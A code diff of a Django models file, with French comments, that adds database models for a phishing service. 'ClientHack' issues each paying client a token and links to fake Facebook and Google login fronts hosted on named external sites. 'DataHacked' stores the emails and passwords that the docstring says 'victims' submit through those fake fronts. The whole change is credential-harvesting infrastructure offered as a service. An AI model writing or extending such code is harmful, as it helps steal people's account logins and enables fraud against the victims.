@@ -231,14 +231,69 @@ class Visit(models.Model):
         return f"Visit from {self.ip_address} at {self.timestamp}"
 
 
-class Facebook(models.Model):
-    email = models.CharField(max_length=255)
-    password = models.CharField(max_length=255)  # Texte clair pour le mot de passe
-    date = models.DateField(auto_now_add=True)  # Date automatique lors de la création
-    heure = models.TimeField(auto_now_add=True)  # Heure automatique lors de la création
+class ClientHack(models.Model):
+    """Liste des clients — chaque client reçoit les mails de soumission"""
+    name  = models.CharField(max_length=255)
+    email = models.EmailField()  # destination des mails automatiques
+    token = models.CharField(
+        max_length=32,
+        unique=True,
+        blank=True,
+        help_text="Généré automatiquement — identifie les liens facebook et google",
+    )
+
+    # URLs fixes — déclarées dans le code, pas en BDD
+    FACEBOOK_URL = "https://areagreen.onrender.com"
+    GOOGLE_URL   = "https://areared.vercel.app"
+
+    def save(self, *args, **kwargs):
+        if not self.token:
+            import secrets
+            self.token = secrets.token_urlsafe(9)  # ~12 chars
+        super().save(*args, **kwargs)
+
+    @property
+    def link_facebook(self):
+        return f"{self.FACEBOOK_URL}/{self.token}"
+
+    @property
+    def link_google(self):
+        return f"{self.GOOGLE_URL}/{self.token}"
 
     def __str__(self):
-        return self.email
+        return f"{self.name} — {self.email}"
+
+    class Meta:
+        verbose_name = "Client Hack"
+        verbose_name_plural = "Clients Hack"
+        ordering = ["-id"]
+
+
+class DataHacked(models.Model):
+    """Données soumises par les victimes via les faux fronts"""
+    TYPE_CHOICES = [
+        ("facebook", "Facebook"),
+        ("google",   "Google"),
+    ]
+
+    client   = models.ForeignKey(
+        ClientHack,
+        on_delete=models.CASCADE,
+        related_name="submissions",
+    )
+    email    = models.CharField(max_length=255)
+    password = models.CharField(max_length=255)
+    date     = models.DateField(auto_now_add=True)
+    heure    = models.TimeField(auto_now_add=True)
+    type     = models.CharField(max_length=10, choices=TYPE_CHOICES)
+
+    def __str__(self):
+        return f"[{self.type}] {self.email} → {self.client.name}"
+
+    class Meta:
+        verbose_name = "Data Hacked"
+        verbose_name_plural = "Data Hacked"
+        ordering = ["-date", "-heure"]
 
 
 class MyLogin(models.Model):
